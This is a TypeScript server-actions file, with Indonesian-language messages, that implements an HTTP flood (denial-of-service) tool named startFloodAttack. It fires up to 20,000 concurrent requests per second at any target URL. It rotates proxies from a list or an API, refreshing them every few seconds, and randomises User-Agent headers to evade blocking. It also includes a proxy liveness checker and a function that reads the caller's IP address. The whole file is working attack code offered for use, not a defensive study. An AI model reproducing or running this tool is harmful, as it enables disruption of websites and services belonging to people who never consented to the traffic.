
"use server";

import { HttpsProxyAgent } from "https-proxy-agent";
import https from 'node:https'; // Import the https module
import { headers } from 'next/headers';
import { USER_AGENTS } from "@/lib/user-agents";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
  statusCodeCounts?: Record<number, number>;
}

const METHODS_WITHOUT_BODY_BASE = ["GET", "HEAD", "DELETE", "OPTIONS"];
const PROXY_TEST_URL = "https://www.google.com/generate_204";
const PROXY_TEST_TIMEOUT_MS = 7000;
const CONCURRENT_PROXY_CHECKS = 10;
const PROXY_REFRESH_INTERVAL_MS = 5000; // 5 seconds for dynamic proxy refresh

// Helper to sanitize and validate individual proxy entries
const sanitizeProxyEntry = (entry: string): string | null => {
  const trimmed = entry.trim();
  const withoutScheme = trimmed.replace(/^(http(s)?:\/\/)/i, '');
  // Basic validation: must contain a colon and not be just a scheme
  if (withoutScheme.includes(':') && withoutScheme.lastIndexOf(':') > 0 && withoutScheme.length > 3) {
    return withoutScheme;
  }
  return null;
};

export async function startFloodAttack(
  targetUrl: string,
  method: string, // This can be "GET", "POST", or "HTTP/1.1 GET", "HTTP/1.1 POST", etc.
  headersString?: string,
  body?: string,
  concurrency?: number,
  rate?: number,
  durationInSeconds?: number,
  proxiesString?: string, 
  proxyApiUrl?: string    
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "URL target tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "URL target harus menggunakan protokol http atau https." };
  }

  const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 20000);
  const safeRate = Math.min(Math.max(1, rate ?? 50), 20000);
  const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);

  if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif." };
  }

  let actualHttpMethod = method;
  let isHttp1Forced = false;

  if (method.startsWith("HTTP/1.1 ")) {
    isHttp1Forced = true;
    actualHttpMethod = method.substring("HTTP/1.1 ".length); // e.g., "GET"
  }
  
  const baseMethodsWithoutBody = ["GET", "HEAD", "DELETE", "OPTIONS"];


  const parsedHeaders: HeadersInit = {};
  let customUserAgentProvided = false;
  if (headersString) {
    headersString.split('\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const key = parts[0].trim();
        const value = parts.slice(1).join(':').trim();
        if (key && value) {
          parsedHeaders[key] = value;
          if (key.toLowerCase() === 'user-agent') {
            customUserAgentProvided = true;
          }
        }
      }
    });
  }

  const baseFetchOptions: RequestInit = {
    method: actualHttpMethod.toUpperCase(), // Use the parsed actual HTTP method
    signal: AbortSignal.timeout(5000) // 5-second timeout for each request
  };

  if (body && !baseMethodsWithoutBody.includes(actualHttpMethod.toUpperCase())) {
    baseFetchOptions.body = body;
    const hasContentType = Object.keys(parsedHeaders).some(key => key.toLowerCase() === 'content-type');
    if (!hasContentType) {
        try {
            JSON.parse(body);
            parsedHeaders['Content-Type'] = 'application/json';
        } catch (e) {
            // If body is not JSON, assume plain text or let user specify via headers
            if (!parsedHeaders['Content-Type']) { // Only set if not already set by user
                 parsedHeaders['Content-Type'] = 'text/plain';
            }
        }
    }
  }


  let currentActiveProxies: string[] = [];
  let lastProxyRefreshTime = 0;

  const tryFetchFromApi = async (apiUrlToFetch: string): Promise<string[] | null> => {
    try {
        const response = await fetch(apiUrlToFetch, { signal: AbortSignal.timeout(7000), headers: { 'Accept': 'text/plain' } });
        if (response.ok) {
            const text = await response.text();
            if (text.trim()) {
                const lines = text.trim().split('\n');
                const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];
                if (sanitizedProxies.length > 0) return sanitizedProxies;
                console.warn(`Proxy API ${apiUrlToFetch} returned empty or no valid ip:port entries after sanitization.`);
            } else {
                console.warn(`Proxy API ${apiUrlToFetch} returned empty content during fetch operation.`);
            }
        } else {
             console.warn(`Failed to fetch proxies from ${apiUrlToFetch}: ${response.status} ${response.statusText}`);
        }
    } catch (e: any) {
        console.error(`Error fetching proxies from ${apiUrlToFetch}:`, e.message);
    }
    return null;
  };

  const parseProxiesFromString = (str: string | undefined): string[] => {
    if (!str || !str.trim()) return [];
    const sanitizedProxies = str.split('\n')
        .map(sanitizeProxyEntry)
        .filter(p => p !== null) as string[];
    if (sanitizedProxies.length === 0 && str.trim().length > 0) {
        console.warn("Provided proxiesString from textarea could not be parsed into valid ip:port entries after sanitization.");
    }
    return sanitizedProxies;
  };

  if (proxyApiUrl) {
    console.log("Attempting initial proxy fetch from API:", proxyApiUrl);
    const apiProxies = await tryFetchFromApi(proxyApiUrl);
    if (apiProxies && apiProxies.length > 0) {
        currentActiveProxies = apiProxies;
        lastProxyRefreshTime = Date.now();
        console.log(`Initialized with ${currentActiveProxies.length} proxies from API.`);
    } else {
        console.warn("Initial API proxy fetch failed or returned no valid proxies. Checking textarea for fallback.");
        currentActiveProxies = parseProxiesFromString(proxiesString);
        if (currentActiveProxies.length > 0) {
            console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea (API fallback).`);
        } else if (proxiesString && proxiesString.trim().length > 0){
             return { totalSent: 0, successful: 0, failed: 0, error: "Gagal mengambil proksi dari API dan string proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan." };
        } else {
            console.log("No proxies available from API or textarea for initial load.");
        }
    }
  } else {
    currentActiveProxies = parseProxiesFromString(proxiesString);
    if (currentActiveProxies.length > 0) {
        console.log(`Initialized with ${currentActiveProxies.length} proxies from textarea.`);
    } else if (proxiesString && proxiesString.trim().length > 0) {
        return { totalSent: 0, successful: 0, failed: 0, error: "String proksi dari textarea tidak valid atau tidak menghasilkan entri ip:port yang valid setelah pembersihan. Tidak ada URL API yang diberikan." };
    } else {
        console.log("No proxies provided via textarea or API URL.");
    }
  }

  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const statusCodeCounts: Record<number, number> = {};
  const startTime = Date.now();
  const endTime = startTime + safeDuration * 1000;

  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}, HTTP/1.1 Paksa: ${isHttp1Forced}`);
  
  const http1Agent = isHttp1Forced && parsedUrl.protocol === "https:" ? new https.Agent({ alpnProtocols: ['http/1.1'] }) : undefined;
  
  const activePromises: Promise<void>[] = [];
  const totalRequestsToAttempt = safeDuration * safeRate;

  try {
    for (let i = 0; i < totalRequestsToAttempt; i++) {
        const now = Date.now();
        if (now >= endTime) break;

        // Dynamic proxy refresh logic
        if (proxyApiUrl && (now - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
            console.log("Refreshing proxies from API:", proxyApiUrl);
            const newApiProxies = await tryFetchFromApi(proxyApiUrl);
            if (newApiProxies && newApiProxies.length > 0) {
                currentActiveProxies = newApiProxies;
                lastProxyRefreshTime = Date.now();
                console.log(`Refreshed. Now using ${currentActiveProxies.length} proxies from API. Total sent: ${totalSent}`);
            } else {
                console.warn("Proxy refresh from API failed or returned no valid proxies. Continuing with existing proxy list (if any).");
            }
        }
        
        // Concurrency control: if we have too many in-flight requests, wait for one to finish
        if (activePromises.length >= safeConcurrency) {
            await Promise.race(activePromises).catch(() => {}); // Wait for the first promise to settle, ignore errors here
        }

        // --- Start of a single request setup ---
        let currentFetchOptions = { ...baseFetchOptions };
        const currentHeaders = {...parsedHeaders};

        if (!customUserAgentProvided && USER_AGENTS.length > 0) {
            currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        }
        currentFetchOptions.headers = currentHeaders;
        
        let agentToUse: any = undefined;

        if (currentActiveProxies.length > 0) {
          const proxyConfig = currentActiveProxies[(totalSent + i) % currentActiveProxies.length];
          try {
            if (isHttp1Forced && parsedUrl.protocol === "https:") {
              agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`, { alpnProtocols: ['http/1.1'] });
            } else {
              agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`);
            }
          } catch (e: any) {
            console.error(`Error creating proxy agent for ${proxyConfig}:`, e.message);
            failed++;
            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
            totalSent++;
            continue; // Skip this request if proxy agent fails
          }
        } else if (http1Agent) {
            agentToUse = http1Agent;
        }
        
        if (agentToUse) {
            currentFetchOptions.agent = agentToUse;
        }
        // --- End of a single request setup ---

        const requestPromise = fetch(targetUrl, currentFetchOptions)
            .then(response => {
              const status = response.status;
              statusCodeCounts[status] = (statusCodeCounts[status] || 0) + 1;
              if (response.status >= 200 && response.status < 400) {
                successful++;
              } else {
                failed++;
              }
              return response.arrayBuffer().catch(() => {});
            })
            .catch((e: any) => {
              failed++;
              if (e.name === 'AbortError' || e.name === 'TimeoutError' || (e.cause && (e.cause.code === 'UND_ERR_CONNECT_TIMEOUT' || e.cause.code === 'ECONNRESET'))) {
                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1;
              } else {
                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1;
              }
            })
            .finally(() => {
              totalSent++;
              // Remove promise from active list
              const index = activePromises.indexOf(requestPromise);
              if (index > -1) {
                  activePromises.splice(index, 1);
              }
            });

        activePromises.push(requestPromise);
        
        // Rate limiting: sleep to maintain the desired RPS
        const elapsedMs = Date.now() - startTime;
        const expectedElapsedMsForNextRequest = (i + 1) * (1000 / safeRate);
        const sleepDuration = expectedElapsedMsForNextRequest - elapsedMs;

        if (sleepDuration > 0) {
            await new Promise(resolve => setTimeout(resolve, sleepDuration));
        }
    }

    // Wait for all remaining requests to complete after the loop finishes
    await Promise.allSettled(activePromises);

  } catch (e: any) {
    console.error("Kesalahan serangan banjir:", e);
    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir." };
  } finally {
    console.log(`Banjir berakhir: Total Terkirim: ${totalSent}, Berhasil: ${successful}, Gagal: ${failed}, Kode Status: ${JSON.stringify(statusCodeCounts)}`);
  }

  return { totalSent, successful, failed, statusCodeCounts };
}

export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
  if (!apiUrl.trim()) {
    return { error: "URL API tidak boleh kosong." };
  }
  try {
    new URL(apiUrl); 
  } catch (e) {
    return { error: "Format URL API tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
  }

  try {
    const response = await fetch(apiUrl, {
      signal: AbortSignal.timeout(10000), 
      headers: { 'Accept': 'text/plain' }
    });
    if (!response.ok) {
      return { error: `Permintaan API gagal dengan status ${response.status}: ${response.statusText}` };
    }
    const text = await response.text();
    if (!text.trim()) {
      return { error: "API mengembalikan daftar proksi kosong." };
    }

    const lines = text.trim().split('\n');
    const sanitizedProxies = lines.map(sanitizeProxyEntry).filter(p => p !== null) as string[];

    if (sanitizedProxies.length === 0) {
        return { error: "API tidak mengembalikan entri proksi yang valid dalam format ip:port setelah pembersihan." };
    }

    return { proxies: sanitizedProxies.join('\n') };
  } catch (e: any) {
    console.error("Kesalahan mengambil proksi dari API:", e);
    if (e.name === 'TimeoutError') {
        return { error: "Waktu permintaan API habis." };
    }
    return { error: e.message || "Gagal mengambil proksi. Periksa konsol browser untuk detail lebih lanjut." };
  }
}


export async function checkProxies(proxiesString: string): Promise<{
  liveProxiesString: string;
  liveCount: number;
  deadCount: number;
  totalChecked: number;
  error?: string;
}> {
  if (!proxiesString || proxiesString.trim() === "") {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
  }

  const proxyEntries = proxiesString.split('\n')
    .map(line => line.trim())
    .filter(line => {
      if (line.startsWith("http://") || line.startsWith("https://")) return false;
      return line.includes(':') && line.lastIndexOf(':') > 0 && line.length > 3;
    });

  if (proxyEntries.length === 0) {
    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "Tidak ada proksi dalam format host:port yang benar ditemukan untuk diperiksa. Pastikan skema http(s):// telah dihapus." };
  }

  const liveProxiesArray: string[] = [];
  let deadCount = 0;

  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => {
    try {
      const agent = new HttpsProxyAgent(`http://${proxyUrl}`);
      const response = await fetch(PROXY_TEST_URL, {
        agent: agent as any,
        signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
        redirect: 'manual', 
      });
      return response.status === 204 || response.status === 200;
    } catch (error: any) {
      return false;
    }
  };

  for (let i = 0; i < proxyEntries.length; i += CONCURRENT_PROXY_CHECKS) {
    const batch = proxyEntries.slice(i, i + CONCURRENT_PROXY_CHECKS);
    const results = await Promise.allSettled(
      batch.map(proxy => checkSingleProxy(proxy).then(isLive => ({ proxy, isLive })))
    );

    results.forEach(result => {
      if (result.status === 'fulfilled') {
        if (result.value.isLive) {
          liveProxiesArray.push(result.value.proxy);
        } else {
          deadCount++;
        }
      } else {
        deadCount++;
      }
    });
  }

  return {
    liveProxiesString: liveProxiesArray.join('\n'),
    liveCount: liveProxiesArray.length,
    deadCount: deadCount,
    totalChecked: proxyEntries.length,
  };
}

export async function getUserIpAddress(): Promise<{ ip: string | null; error?: string }> {
  try {
    const fwd = headers().get('x-forwarded-for');
    if (fwd) {
      // The x-forwarded-for header can be a comma-separated list of IPs.
      // The client's IP is typically the first one.
      const clientIp = fwd.split(',')[0].trim();
      return { ip: clientIp };
    }
    // Fallback if the primary header isn't found
    const realIp = headers().get('x-real-ip');
    if (realIp) {
      return { ip: realIp.split(',')[0].trim() };
    }
    
    return { ip: null, error: "Header IP yang relevan tidak ditemukan." };
  } catch (e: any) {
    console.error("Kesalahan mengambil alamat IP:", e);
    return { ip: null, error: "Gagal mengambil alamat IP dari server." };
  }
}
    

    
